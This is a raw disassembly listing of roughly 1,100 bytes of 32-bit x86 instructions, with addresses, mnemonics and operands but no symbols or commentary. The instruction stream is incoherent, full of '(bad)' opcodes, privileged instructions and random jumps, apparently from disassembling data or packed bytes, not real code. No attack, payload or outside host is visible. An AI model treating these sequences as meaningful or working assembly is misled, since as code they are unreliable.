  489d36:	xor    al,0x1a
  489d38:	sbb    ah,BYTE PTR [edx+0x25]
  489d3b:	jbe    0x489daf
  489d3d:	adc    DWORD PTR [eax],eax
  489d3f:	mov    ebx,DWORD PTR [edi+0x60023037]
  489d45:	stos   BYTE PTR es:[edi],al
  489d46:	add    al,0xef
  489d48:	inc    esp
  489d49:	aaa    
  489d4a:	push   eax
  489d4b:	mov    al,0x66
  489d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489d4e:	out    dx,eax
  489d4f:	pop    ss
  489d50:	popa   
  489d51:	sbb    eax,DWORD PTR [edi+0x25473f88]
  489d57:	sub    al,0x22
  489d59:	loop   0x489d4a
  489d5b:	push   edi
  489d5c:	nop
  489d5d:	stos   DWORD PTR es:[edi],eax
  489d5e:	and    dh,dl
  489d60:	dec    edi
  489d61:	das    
  489d62:	inc    ebx
  489d63:	popa   
  489d64:	sub    eax,0x1c239580
  489d69:	push   ss
  489d6a:	(bad)  
  489d6c:	scas   eax,DWORD PTR es:[edi]
  489d6d:	call   FWORD PTR [edx+0xc43212]
  489d73:	(bad)  
  489d74:	mov    ss:0x9f275b40,al
  489d7a:	not    DWORD PTR [edi]
  489d7c:	and    al,0xf0
  489d7e:	inc    ebp
  489d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489d80:	addr16 inc ebp
  489d82:	fsubr  QWORD PTR [edx+0x6d]
  489d85:	aaa    
  489d86:	out    dx,eax
  489d87:	or     al,cl
  489d89:	je     0x489dfa
  489d8b:	aad    0xe7
  489d8d:	jg     0x489da9
  489d8f:	das    
  489d90:	test   DWORD PTR [edx],edx
  489d92:	add    al,0xc0
  489d94:	xor    ebp,edi
  489d96:	fisttp WORD PTR [ebp+0xf582ac2]
  489d9c:	xlat   BYTE PTR ds:[ebx]
  489d9d:	shl    BYTE PTR [eax+eiz*1+0x8],cl
  489da1:	xchg   DWORD PTR [ebp+0xe],eax
  489da4:	push   ebx
  489da5:	stos   DWORD PTR es:[edi],eax
  489da6:	ins    DWORD PTR es:[edi],dx
  489da7:	xchg   DWORD PTR [edi+0x4f],eax
  489daa:	es ret 
  489dac:	icebp  
  489dad:	mov    al,0xab
  489daf:	xchg   DWORD PTR [eax],esi
  489db1:	mov    ch,0xa6
  489db3:	add    DWORD PTR [ebx+0x2817a792],0x37
  489dba:	or     edx,ecx
  489dbc:	dec    edi
  489dbd:	fbstp  TBYTE PTR [eax]
  489dbf:	mov    DWORD PTR [eax+0x37],ebx
  489dc2:	out    dx,al
  489dc3:	sbb    cl,BYTE PTR [ebx-0x4a2a7150]
  489dc9:	pop    ds
  489dca:	push   edi
  489dcb:	aaa    
  489dcc:	adc    BYTE PTR [edx-0x5e],al
  489dcf:	and    BYTE PTR [edi],ah
  489dd1:	inc    eax
  489dd2:	add    eax,DWORD PTR [esi]
  489dd4:	stos   DWORD PTR es:[edi],eax
  489dd5:	xchg   edi,eax
  489dd6:	cs pop edi
  489dd8:	test   al,0x16
  489dda:	and    eax,0xbf4335d4
  489ddf:	mov    edi,0x390b7496
  489de4:	xor    dl,BYTE PTR [edi+0x45]
  489de7:	inc    eax
  489de8:	xlat   BYTE PTR ds:[ebx]
  489de9:	push   0x32
  489deb:	fild   WORD PTR [edi-0x3f9d86f8]
  489df1:	xor    eax,DWORD PTR [edi+0x8320037]
  489df7:	les    eax,FWORD PTR [eax-0x78c698a7]
  489dfd:	outs   dx,DWORD PTR ds:[esi]
  489dfe:	ins    DWORD PTR es:[edi],dx
  489dff:	xor    BYTE PTR [edi+eax*1],ch
  489e02:	xlat   BYTE PTR ds:[ebx]
  489e03:	dec    edi
  489e04:	jnp    0x489e39
  489e06:	mov    al,0x88
  489e08:	add    DWORD PTR [edi-0x41],esi
  489e0b:	mov    bl,0x16
  489e0d:	xor    BYTE PTR [eax-0x79],ah
  489e10:	daa    
  489e11:	sbb    al,0xc0
  489e13:	pop    ebx
  489e14:	pop    eax
  489e15:	sub    bh,BYTE PTR [edi+0x173248b0]
  489e1b:	xor    esp,edi
  489e1d:	push   cs
  489e1e:	mov    DWORD PTR [ebp+0x13],eax
  489e21:	mov    edi,0x1b8a399b
  489e26:	and    DWORD PTR [edi],0x52
  489e29:	inc    edi
  489e2a:	ss ins DWORD PTR es:[edi],dx
  489e2c:	bound  ecx,QWORD PTR [ebp-0x40]
  489e2f:	mov    edi,0xc5b4c918
  489e34:	out    dx,eax
  489e35:	scas   eax,DWORD PTR es:[edi]
  489e36:	xor    BYTE PTR [eax],al
  489e38:	xchg   DWORD PTR [esi+0x49],ebx
  489e3b:	mov    bl,0x46
  489e3d:	daa    
  489e3e:	inc    ecx
  489e3f:	and    ch,bl
  489e41:	fdiv   DWORD PTR [edi]
  489e43:	scas   eax,DWORD PTR es:[edi]
  489e44:	fimul  WORD PTR [edi]
  489e46:	dec    ebp
  489e47:	sub    esp,DWORD PTR [esi]
  489e49:	and    BYTE PTR [edi+0x101d262f],bh
  489e4f:	sub    al,BYTE PTR [edi-0x7971e4cb]
  489e55:	jmp    0x489e9b
  489e57:	addr16 xor eax,0xc85437d7
  489e5d:	add    esi,ecx
  489e5f:	cmp    esp,DWORD PTR [esi+0x43]
  489e62:	ret    0xc4aa
  489e65:	add    BYTE PTR [edi],0x27
  489e68:	adc    BYTE PTR ds:[ecx+0x38670f11],ah
  489e6f:	lods   eax,DWORD PTR ds:[esi]
  489e70:	xchg   edx,eax
  489e71:	xchg   DWORD PTR [eax+0x43],eax
  489e74:	add    BYTE PTR [eax],bh
  489e76:	push   esi
  489e77:	aaa    
  489e78:	jne    0x489eaa
  489e7a:	das    
  489e7b:	cmp    DWORD PTR [edi],ebx
  489e7d:	inc    ebx
  489e7e:	repnz sbb eax,0x35384fff
  489e85:	in     al,0x88
  489e87:	dec    edx
  489e88:	and    DWORD PTR [esi+0x34],esp
  489e8b:	sub    BYTE PTR [edi],0x8
  489e8e:	sub    DWORD PTR [ebx+0x31],esp
  489e91:	sbb    ebx,DWORD PTR [eax-0x6f]
  489e94:	mov    edi,0xc05323f
  489e99:	les    esi,FWORD PTR [edi]
  489e9b:	aaa    
  489e9c:	inc    esp
  489e9d:	je     0x489efc
  489e9f:	push   ecx
  489ea0:	push   ebx
  489ea1:	inc    ecx
  489ea2:	addr16 aas 
  489ea4:	push   eax
  489ea5:	lods   al,BYTE PTR ds:[esi]
  489ea6:	push   es
  489ea7:	bound  ecx,QWORD PTR [edi]
  489ea9:	pop    ss
  489eaa:	push   0x20
  489eac:	push   ss
  489ead:	xor    dh,BYTE PTR [eax]
  489eaf:	daa    
  489eb0:	add    al,0x6b
  489eb2:	push   ss
  489eb3:	mov    cl,0xaf
  489eb5:	mov    edi,0xa7a51891
  489eba:	pop    edi
  489ebb:	adc    BYTE PTR [bx+si+0x2758],bh
  489ec0:	(bad)  
  489ec1:	jg     0x489e69
  489ec3:	sbb    eax,0x8f2fa052
  489ec8:	jg     0x489f2b
  489eca:	adc    BYTE PTR [edx],ah
  489ecc:	(bad)  
  489ecd:	xchg   edx,ecx
  489ecf:	imul   eax,DWORD PTR [ebp+0x21],0x3a370762
  489ed6:	mov    BYTE PTR [ebp+ecx*1+0x3f],dl
  489eda:	(bad)  
  489edb:	or     BYTE PTR fs:[esi],al
  489ede:	loop   0x489f16
  489ee0:	pop    ds
  489ee1:	aaa    
  489ee2:	stos   BYTE PTR es:[edi],al
  489ee3:	sbb    eax,0x371f2a44
  489ee8:	xchg   ebp,eax
  489ee9:	fadd   QWORD PTR [eax-0x5c]
  489eec:	pop    ds
  489eed:	xor    eax,0x803710bb
  489ef2:	mov    cr0,edi
  489ef5:	or     eax,0x67d62ad4
  489efa:	ja     0x489f41
  489efc:	pop    eax
  489efd:	lds    ebx,FWORD PTR [edx-0x79]
  489f00:	bound  ebx,QWORD PTR [bp+di]
  489f03:	sub    eax,0x4e9f4276
  489f08:	dec    ebx
  489f09:	stos   DWORD PTR es:[edi],eax
  489f0a:	dec    ebp
  489f0b:	enter  0x1f07,0x30
  489f0f:	inc    ecx
  489f10:	pop    edi
  489f11:	jb     0x489f34
  489f13:	(bad)  
  489f14:	dec    esi
  489f15:	(bad)  
  489f16:	pop    edi
  489f17:	inc    ebx
  489f18:	cmp    DWORD PTR [edi+0x61],esp
  489f1b:	inc    ebp
  489f1c:	push   edi
  489f1d:	xor    BYTE PTR [edi],ah
  489f1f:	lahf   
  489f20:	cmp    esi,edx
  489f22:	push   esi
  489f23:	leave  
  489f24:	xor    DWORD PTR [edi+0x3f],edi
  489f27:	scas   al,BYTE PTR es:[edi]
  489f28:	jbe    0x489f7f
  489f2a:	adc    BYTE PTR [edi-0x6ebc20bd],bh
  489f30:	stos   BYTE PTR es:[edi],al
  489f31:	and    edi,edx
  489f33:	pop    edi
  489f34:	cmp    BYTE PTR [edi],dh
  489f36:	stos   DWORD PTR es:[edi],eax
  489f37:	imul   eax,DWORD PTR ds:0x545f1f05,0x3f5a1569
  489f41:	jle    0x489f88
  489f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489f44:	push   ecx
  489f45:	lods   al,BYTE PTR ds:[esi]
  489f46:	nop
  489f47:	daa    
  489f48:	pop    ebx
  489f49:	adc    eax,0x71fb8c4
  489f4e:	fild   QWORD PTR [edx-0x39efd1e0]
  489f54:	pop    ds
  489f55:	and    BYTE PTR ds:0x38bfb0c7,0x7
  489f5c:	stos   BYTE PTR es:[edi],al
  489f5d:	and    BYTE PTR [esi+0x737b7d8],cl
  489f63:	adc    DWORD PTR [ecx],edx
  489f65:	dec    eax
  489f66:	sahf   
  489f67:	cmp    BYTE PTR [eax],al
  489f69:	xor    al,BYTE PTR [edi]
  489f6b:	add    esi,DWORD PTR [ecx-0x30f8ea7e]
  489f71:	call   0x88c5:0x3454c95a
  489f78:	push   ebx
  489f79:	test   eax,0x61bf9f47
  489f7e:	mov    bh,0x56
  489f80:	ret    
  489f81:	mov    bh,0x37
  489f83:	mov    cl,0xe4
  489f85:	fsubr  DWORD PTR [edx-0x57c71081]
  489f8b:	loop   0x489fe3
  489f8d:	add    eax,DWORD PTR [edi-0x2a]
  489f90:	(bad)  
  489f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489f92:	imul   ebx,DWORD PTR ds:0x353fcfc4,0xd
  489f99:	inc    esp
  489f9a:	mov    eax,ds:0xdf30ffe7
  489f9f:	add    ebx,DWORD PTR [edx+0xd]
  489fa2:	les    esi,FWORD PTR [esi]
  489fa4:	xlat   BYTE PTR ds:[ebx]
  489fa5:	or     al,0x6
  489fa7:	pop    ecx
  489fa8:	mov    eax,ds:0x1c121f8f
  489fad:	les    ebp,FWORD PTR [edi-0x29]
  489fb0:	xor    al,0xcf
  489fb2:	or     dh,BYTE PTR [eax+edx*1]
  489fb5:	sbb    ecx,DWORD PTR [edi]
  489fb7:	out    dx,eax
  489fb8:	mov    cl,0x98
  489fba:	mov    al,0x8
  489fbc:	daa    
  489fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489fbe:	mov    eax,DWORD PTR [edx+0x3faf075a]
  489fc4:	push   0x58
  489fc6:	add    eax,0x572f4380
  489fcb:	mov    DWORD PTR [ebx+0x6ff7d3c0],edx
  489fd1:	adc    eax,0xcf103158
  489fd6:	dec    edi
  489fd7:	scas   al,BYTE PTR es:[edi]
  489fd8:	push   ebp
  489fd9:	mov    cl,0xb6
  489fdb:	lahf   
  489fdc:	xlat   BYTE PTR ds:[ebx]
  489fdd:	fild   DWORD PTR [ebx]
  489fdf:	stos   DWORD PTR es:[edi],eax
  489fe0:	push   cs
  489fe1:	loop   0x48a019
  489fe3:	out    dx,eax
  489fe4:	lds    eax,FWORD PTR [esi-0x2ca053f5]
  489fea:	outs   dx,DWORD PTR ds:[esi]
  489feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  489fec:	call   0x77cb5013
  489ff1:	xchg   DWORD PTR [ebx],eax
  489ff3:	mov    bh,0x5b
  489ff5:	(bad)  
  489ff6:	aaa    
  489ff7:	scas   al,BYTE PTR es:[edi]
  489ff8:	add    cl,BYTE PTR [esi]
  489ffa:	and    dh,BYTE PTR [edi+ebx*4-0x31]
  489ffe:	push   es
  489fff:	bound  ecx,QWORD PTR ds:0xfc741ef
  48a005:	fist   WORD PTR ds:0xdf009107
  48a00b:	inc    ebp
  48a00c:	lods   eax,DWORD PTR ds:[esi]
  48a00d:	bound  esp,QWORD PTR [ecx+0x17]
  48a010:	adc    eax,0xf0ae602
  48a015:	xor    al,0x5f
  48a017:	add    ebx,DWORD PTR [ebx+0x44]
  48a01a:	imul   ebp,DWORD PTR [edi-0x544eb9a9],0xffffff83
  48a021:	cmp    bh,bl
  48a023:	inc    esp
  48a024:	push   edi
  48a025:	push   0x6c
  48a027:	(bad)  
  48a028:	popa   
  48a029:	mov    ?,ebx
  48a02b:	mov    bh,0xa4
  48a02d:	push   eax
  48a02e:	add    esi,DWORD PTR [ecx+0x40a2c4df]
  48a034:	mov    ebx,0x81d67793
  48a039:	push   ebp
  48a03a:	sbb    al,0xdf
  48a03c:	pop    edi
  48a03d:	inc    ecx
  48a03e:	lods   al,BYTE PTR ds:[esi]
  48a03f:	push   0x20
  48a041:	fild   WORD PTR [eax+0x2c]
  48a044:	pop    eax
  48a045:	(bad)
  48a048:	add    eax,0xdfc4355a
  48a04d:	xor    cl,BYTE PTR [ebx+0x5f]
  48a050:	sub    al,0x6
  48a052:	ret    0x465c
  48a055:	fist   WORD PTR [edx+esi*8]
  48a058:	aad    0x41
  48a05a:	fbstp  TBYTE PTR [eax+eax*1]
  48a05d:	xor    DWORD PTR [ebp+0x3],eax
  48a060:	xchg   ecx,eax
  48a061:	xchg   BYTE PTR [edi],cl
  48a063:	fild   QWORD PTR [edx]
  48a065:	test   DWORD PTR [edx+ebp*2],ebx
  48a068:	fiadd  WORD PTR [ebx-0x10]
  48a06b:	push   0x4117305d
  48a070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a071:	inc    esi
  48a072:	add    al,0x4a
  48a074:	mov    cl,0x17
  48a076:	outs   dx,DWORD PTR ds:[esi]
  48a077:	inc    ecx
  48a078:	lods   al,BYTE PTR ds:[esi]
  48a079:	pusha  
  48a07a:	and    bh,bl
  48a07c:	mov    ds:0xdfc558da,eax
  48a081:	pop    ds
  48a082:	add    ah,BYTE PTR [ecx]
  48a084:	sbb    cl,BYTE PTR [eax+0x711df35]
  48a08a:	mov    cl,0xc0
  48a08c:	push   0x76
  48a08e:	fild   WORD PTR ds:0x760b43a
  48a094:	pop    ds
  48a095:	or     BYTE PTR [ecx+0x3b],0x4
  48a099:	jmp    0x48a0ba
  48a09b:	cwde   
  48a09c:	hlt    
  48a09d:	xchg   ebx,eax
  48a09e:	ror    BYTE PTR [ebx+0x45],1
  48a0a1:	pop    ds
  48a0a2:	xchg   ecx,eax
  48a0a3:	mov    BYTE PTR [ecx+eax*1-0x7aba00cf],cl
  48a0aa:	mov    ss,WORD PTR [esi+0x17]
  48a0ad:	imul   ebx,edi,0x49
  48a0b0:	and    dl,BYTE PTR [edx+esi*8]
  48a0b3:	inc    ebx
  48a0b4:	add    BYTE PTR [ecx+0x60],al
  48a0b7:	xor    eax,0xefe7d569
  48a0bc:	inc    ecx
  48a0bd:	gs sbb al,0xac
  48a0c0:	addr16 (bad) 
  48a0c2:	addr16 push esp
  48a0c4:	push   0x97f66e15
  48a0c9:	fisttp WORD PTR [eax+0x63]
  48a0cc:	and    eax,0x3700360f
  48a0d1:	lods   eax,DWORD PTR ds:[esi]
  48a0d2:	shl    BYTE PTR [edx],0x50
  48a0d5:	daa    
  48a0d6:	out    dx,eax
  48a0d7:	fisttp WORD PTR [edx+0x51]
  48a0da:	and    DWORD PTR [esi],esp
  48a0dc:	fild   WORD PTR [edi-0x38dea96d]
  48a0e2:	sub    esi,edi
  48a0e4:	out    0xc4,eax
  48a0e6:	or     cl,BYTE PTR [ecx-0x53c1c71c]
  48a0ec:	mov    eax,esi
  48a0ee:	test   al,0x97
  48a0f0:	xchg   edi,eax
  48a0f1:	call   0x4f4ed228
  48a0f6:	aaa    
  48a0f7:	scas   al,BYTE PTR es:[edi]
  48a0f8:	bound  ebx,QWORD PTR [ecx]
  48a0fa:	out    dx,eax
  48a0fb:	inc    ecx
  48a0fc:	xor    ebp,edi
  48a0fe:	cmp    BYTE PTR [esi],dh
  48a100:	pusha  
  48a101:	xchg   esp,eax
  48a102:	inc    edx
  48a103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a104:	cmp    ch,dh
  48a106:	or     ch,BYTE PTR [ebx+0xf]
  48a109:	jecxz  0x48a0dd
  48a10b:	pop    ds
  48a10c:	fwait
  48a10d:	mov    al,0x1
  48a10f:	les    edx,FWORD PTR [edi-0x31]
  48a112:	or     edx,eax
  48a114:	mov    edx,0x71e71670
  48a119:	xor    DWORD PTR [ebp-0x5c],0xbab4717
  48a120:	sub    eax,DWORD PTR [esi+0x5732bf08]
  48a126:	icebp  
  48a127:	pop    eax
  48a128:	or     eax,DWORD PTR [edx+0x4f]
  48a12b:	sbb    esi,DWORD PTR [ebx]
  48a12d:	outs   dx,DWORD PTR ds:[esi]
  48a12e:	ret    
  48a12f:	fwait
  48a130:	or     al,BYTE PTR [edi-0x707800ce]
  48a136:	adc    al,0x3a
  48a138:	sbb    bl,BYTE PTR [esi-0x4e]
  48a13b:	iret   
  48a13c:	inc    edx
  48a13d:	pop    es
  48a13e:	jno    0x48a155
  48a140:	dec    ebx
  48a141:	or     bh,dh
  48a143:	inc    esi
  48a144:	popa   
  48a145:	mov    ecx,0x7afaab6
  48a14a:	cmp    DWORD PTR [eax-0xbdd225],edx
  48a150:	mov    fs,edi
  48a152:	xor    cl,BYTE PTR [eax]
  48a154:	stos   DWORD PTR es:[edi],eax
  48a155:	sbb    eax,0x85e7170c
  48a15a:	or     al,0xc3
  48a15c:	bound  esp,QWORD PTR [ebx+0x1f]
  48a15f:	xor    BYTE PTR [edx+0x20],bl
  48a162:	pop    esp
  48a163:	enter  0x3133,0x13
  48a167:	mov    ss,WORD PTR [ecx]
  48a169:	mov    eax,ds:0x3957e74b
  48a16e:	mov    cl,0xa
  48a170:	or     DWORD PTR [edi+edi*4+0x23],eax
  48a174:	push   ebp
  48a175:	push   es
  48a176:	(bad)  
  48a177:	das    
  48a178:	pop    ds
  48a179:	bound  eax,QWORD PTR [edx+0x37676ab0]
  48a17f:	and    BYTE PTR ds:0xce9f351b,cl
  48a185:	cmp    DWORD PTR ds:0x760b623,ecx
  48a18b:	aas    
  48a18c:	aas    
  48a18d:	mov    cl,0x88
  48a18f:	loope  0x48a1f1
  48a191:	fistp  QWORD PTR [edi]
  48a193:	add    DWORD PTR [ebx+0x48],edx
  48a196:	mov    ch,0x7e
  48a198:	cmp    BYTE PTR ds:0xac04aa96,dh
  48a19e:	dec    edi
  48a19f:	pop    es
  48a1a0:	aas    
  48a1a1:	sub    esp,esp
  48a1a3:	and    BYTE PTR [ecx+0x43],0x3f
  48a1a7:	inc    ebx
  48a1a8:	sbb    cl,BYTE PTR [esi]
  48a1aa:	jbe    0x48a1bf
  48a1ac:	aas    
  48a1ad:	addr16 aas 
  48a1af:	mov    ds:0x7ac1618,eax
  48a1b4:	jg     0x48a1d2
  48a1b6:	nop
  48a1b7:	or     al,0x1c
  48a1b9:	jg     0x48a1ef
  48a1bb:	xor    al,0xe0
  48a1bd:	sub    eax,ebp
  48a1bf:	or     BYTE PTR [edi+0xc718e7f],al
  48a1c5:	xor    DWORD PTR [edi],esi
  48a1c7:	ss mov edi,0x902e587f
  48a1cd:	or     DWORD PTR [eax],esi
  48a1cf:	inc    ebp
  48a1d0:	pop    edx
  48a1d1:	sbb    dl,BYTE PTR [eax]
  48a1d3:	adc    ebx,DWORD PTR [edi+0x75bd8b86]
  48a1d9:	lahf   
  48a1da:	out    dx,eax
  48a1db:	aas    
  48a1dc:	inc    esp
  48a1dd:	aas    
  48a1de:	les    eax,FWORD PTR [edx]
  48a1e0:	in     al,0x8a
  48a1e2:	cmp    BYTE PTR [ecx+0x43],dh
  48a1e5:	pop    edx
  48a1e6:	dec    ebp
  48a1e7:	pop    edi
  48a1e8:	inc    edi
  48a1e9:	pop    ebx
  48a1ea:	sbb    BYTE PTR ds:0x1752a781,al
  48a1f0:	je     0x48a207
  48a1f2:	jg     0x48a239
  48a1f4:	shrd   DWORD PTR [ebx+0x678f9ac2],ecx,0x8
  48a1fc:	or     eax,0xef3f44d8
  48a201:	or     DWORD PTR [ebp-0x48c08f40],ebp
  48a207:	xor    al,0x5b
  48a209:	fisttp DWORD PTR [edx]
  48a20b:	xlat   BYTE PTR ds:[ebx]
  48a20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a20d:	out    dx,eax
  48a20e:	adc    eax,0x3130a6ec
  48a213:	xor    ebp,DWORD PTR [edi]
  48a215:	fadd   QWORD PTR [esi+0x2736db00]
  48a21b:	out    dx,eax
  48a21c:	inc    ecx
  48a21d:	inc    edi
  48a21e:	cmp    BYTE PTR [edi],al
  48a220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a221:	sub    eax,0x30af4697
  48a226:	pop    edi
  48a227:	mov    al,0xa4
  48a229:	xchg   DWORD PTR [esi-0x79],edx
  48a22c:	inc    edx
  48a22d:	pop    ss
  48a22e:	xchg   esi,eax
  48a22f:	mov    ah,0x34
  48a231:	iret   
  48a232:	xor    BYTE PTR [ebx-0x26],bh
  48a235:	inc    ebp
  48a236:	sub    eax,0xbaff3fd4
  48a23b:	add    al,0x69
  48a23d:	imul   esp,DWORD PTR [edi],0x3
  48a240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a241:	jp     0x48a218
  48a243:	or     bl,ah
  48a245:	rcl    DWORD PTR [edi+0x27],0x51
  48a249:	rcr    BYTE PTR [eax-0x5f],1
  48a24c:	pop    ds
  48a24d:	dec    DWORD PTR [ecx]
  48a24f:	es call 0xb5afb97d
  48a255:	adc    al,0xa1
  48a258:	xor    eax,0x710a0f67
  48a25d:	mov    DWORD PTR [ecx],edx
  48a25f:	dec    edi
  48a260:	(bad)  
  48a261:	and    DWORD PTR [ecx-0x54],esi
  48a264:	jmp    0x48a2ab
  48a266:	dec    edi
  48a267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a268:	stos   DWORD PTR es:[edi],eax
  48a269:	push   cs
  48a26a:	or     eax,0xeb8f074a
  48a26f:	rol    BYTE PTR [edi],1
  48a271:	test   DWORD PTR [edx+0x3b],eax
  48a274:	(bad)
  48a278:	dec    ebx
  48a279:	(bad)  
  48a27a:	sub    eax,0x7fc72120
  48a27f:	xor    eax,0x456325c5
  48a284:	pop    es
  48a285:	(bad)  
  48a286:	jl     0x48a22c
  48a288:	nop
  48a289:	mov    eax,0x8d9f8f62
  48a28e:	adc    ebx,ebx
  48a290:	inc    esp
  48a291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a292:	dec    edi
  48a293:	jecxz  0x48a2af
  48a295:	mov    ah,0xaa
  48a297:	fisttp WORD PTR [edi+0x37]
  48a29a:	mov    ds:0x3247000,al
  48a29f:	das    
  48a2a0:	inc    ecx
  48a2a1:	pop    edx
  48a2a2:	and    eax,0xdad4ff14
  48a2a7:	cmp    dl,BYTE PTR [esi-0x61]
  48a2aa:	iret   
  48a2ab:	push   DWORD PTR [esi-0x20dd2148]
  48a2b1:	dec    edi
  48a2b2:	pop    edi
  48a2b3:	pop    edi
  48a2b4:	mov    cl,0xe4
  48a2b6:	add    bl,BYTE PTR [ecx-0x1dd9bcbd]
  48a2bc:	loop   0x48a23e
  48a2be:	pop    es
  48a2bf:	xor    al,0xcf
  48a2c1:	jae    0x48a26e
  48a2c3:	stos   BYTE PTR es:[edi],al
  48a2c4:	nop
  48a2c5:	lahf   
  48a2c6:	das    
  48a2c7:	ja     0x48a2a3
  48a2c9:	xor    al,0xe0
  48a2cb:	pop    edx
  48a2cc:	inc    edi
  48a2cd:	das    
  48a2ce:	ret    
  48a2cf:	mov    ebx,0x864f4c10
  48a2d4:	xchg   edi,eax
  48a2d5:	pop    edi
  48a2d6:	test   BYTE PTR [edx+0x27d75b41],al
  48a2dc:	lods   eax,DWORD PTR ds:[esi]
  48a2dd:	or     esi,DWORD PTR [edi+0x7f1e5f4a]
  48a2e3:	add    cl,dl
  48a2e5:	test   DWORD PTR [esi],eax
  48a2e7:	pop    DWORD PTR [edi+0x213f40ff]
  48a2ed:	lods   al,BYTE PTR ds:[esi]
  48a2ee:	jmp    0x48a333
  48a2f0:	inc    eax
  48a2f1:	add    BYTE PTR [eax+edx*1-0x9],cl
  48a2f5:	xor    eax,0x3314a2bf
  48a2fa:	xor    eax,0x4127b732
  48a2ff:	mov    eax,ds:0x9767b1d5
  48a304:	push   eax
  48a305:	mov    BYTE PTR [edx-0x59],al
  48a308:	ret    0x3a5f
  48a30b:	add    BYTE PTR [eax+eiz*4+0x4b38c6cf],al
  48a312:	dec    ebx
  48a313:	inc    ebx
  48a314:	dec    eax
  48a315:	(bad)  
  48a317:	push   es
  48a318:	mov    WORD PTR [ebx+0x41],cs
  48a31b:	mov    eax,ds:0x2e851287
  48a320:	add    DWORD PTR [ebx-0x6de2e875],ebp
  48a326:	mov    fs,WORD PTR [edx]
  48a328:	xchg   DWORD PTR [ebx-0x69],eax
  48a32b:	jp     0x48a335
  48a32d:	imul   ecx,DWORD PTR [eax],0xf
  48a330:	ja     0x48a365
  48a332:	js     0x48a370
  48a334:	nop
  48a335:	inc    eax
  48a336:	cs push edx
  48a338:	adc    DWORD PTR [eax+0x4367dba9],0x1bac001a
  48a342:	pop    ss
  48a343:	daa    
  48a344:	and    dh,BYTE PTR [eax+0x7487b42a]
  48a34a:	push   ebp
  48a34b:	mov    eax,ds:0x45876395
  48a350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a351:	stos   DWORD PTR es:[edi],eax
  48a352:	ret    
  48a353:	fdiv   DWORD PTR [edi+0x2f]
  48a356:	cmp    BYTE PTR [ebp+0x29],dl
  48a359:	leave  
  48a35a:	push   esp
  48a35b:	xchg   DWORD PTR ds:0x6e2e02f7,esi
  48a361:	popa   
  48a362:	aaa    
  48a363:	aaa    
  48a364:	sub    dl,BYTE PTR [ebx+eiz*2]
  48a367:	push   0x7f
  48a369:	cmp    BYTE PTR [edi-0x54],al
  48a36c:	dec    eax
  48a36d:	mov    ds:0x38874722,eax
  48a372:	mov    eax,0x271f0b8d
  48a377:	inc    ebp
  48a378:	dec    edx
  48a379:	rol    BYTE PTR [esi],1
  48a37b:	ins    DWORD PTR es:[edi],dx
  48a37c:	das    
  48a37d:	inc    ebx
  48a37e:	xchg   esp,eax
  48a37f:	push   ss
  48a380:	xchg   edi,eax
  48a381:	mov    al,0x2b
  48a383:	pop    edi
  48a384:	or     al,BYTE PTR [esi+0x43e73bc6]
  48a38a:	xchg   BYTE PTR [edi-0x7f],ch
  48a38d:	in     eax,dx
  48a38e:	mov    ah,0x30
  48a390:	jmp    FWORD PTR [edi]
  48a392:	or     eax,0x31930a46
  48a397:	mov    edi,0x3d02253a
  48a39c:	dec    edi
  48a39d:	(bad)  
  48a39e:	and    ch,BYTE PTR [edx+eax*1-0x4b]
  48a3a2:	cmp    al,0x17
  48a3a4:	inc    ebp
  48a3a5:	aaa    
  48a3a6:	mov    ds:0x4b490ba1,eax
  48a3ab:	add    esi,DWORD PTR ss:[edi-0x18b54fb0]
  48a3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a3b3:	dec    esi
  48a3b4:	aaa    
  48a3b5:	lods   al,BYTE PTR ds:[esi]
  48a3b6:	push   ebp
  48a3b7:	sbb    DWORD PTR [edi+0x7f],edi
  48a3ba:	test   eax,0x67c101c4
  48a3bf:	inc    edx
  48a3c0:	cmovns eax,DWORD PTR [ecx-0x39e0f7ee]
  48a3c7:	inc    ecx
  48a3c8:	shl    BYTE PTR [edx],cl
  48a3ca:	push   es
  48a3cb:	and    esp,DWORD PTR [edi+0x6ac450b1]
  48a3d1:	iret   
  48a3d2:	pop    ds
  48a3d3:	adc    ah,BYTE PTR [ecx+0x37275031]
  48a3d9:	inc    edi
  48a3da:	push   0x61
  48a3dc:	adc    eax,0x54afef84
  48a3e1:	mov    eax,ds:0x39328e41
  48a3e6:	addr16 mov edx,0x96ba150a
  48a3ec:	addr16 inc edi
  48a3ee:	jmp    0x48a384
  48a3f0:	add    al,BYTE PTR [ebp+0x5f]
  48a3f3:	daa    
  48a3f4:	push   es
  48a3f5:	mov    WORD PTR [edx+0x48],gs
  48a3f8:	aas    
  48a3f9:	daa    
  48a3fa:	xor    BYTE PTR [ecx+ecx*1-0x48],0x43
  48a3ff:	jecxz  0x48a430
  48a401:	icebp  
  48a402:	push   cs
  48a403:	and    ah,BYTE PTR [ebp+0x7027449f]
  48a409:	adc    DWORD PTR [edx-0x75],ebx
  48a40c:	pop    ss
  48a40d:	pop    edi
  48a40e:	inc    ebp
  48a40f:	call   0x8f8fc576
  48a414:	inc    ecx
  48a415:	arpl   WORD PTR [eax],cx
  48a417:	mov    BYTE PTR [ecx+eiz*1+0x6f],al
  48a41b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a41c:	add    BYTE PTR [esi+edx*2],cl
  48a41f:	mov    ebx,0x68fb6743
  48a424:	mov    cl,0x49
  48a426:	outs   dx,BYTE PTR ds:[esi]
  48a427:	pop    es
  48a428:	inc    ebx
  48a429:	inc    edx
  48a42a:	push   edi
  48a42b:	lods   al,BYTE PTR ds:[esi]
  48a42c:	jmp    0x48a454
  48a42e:	xchg   esp,eax
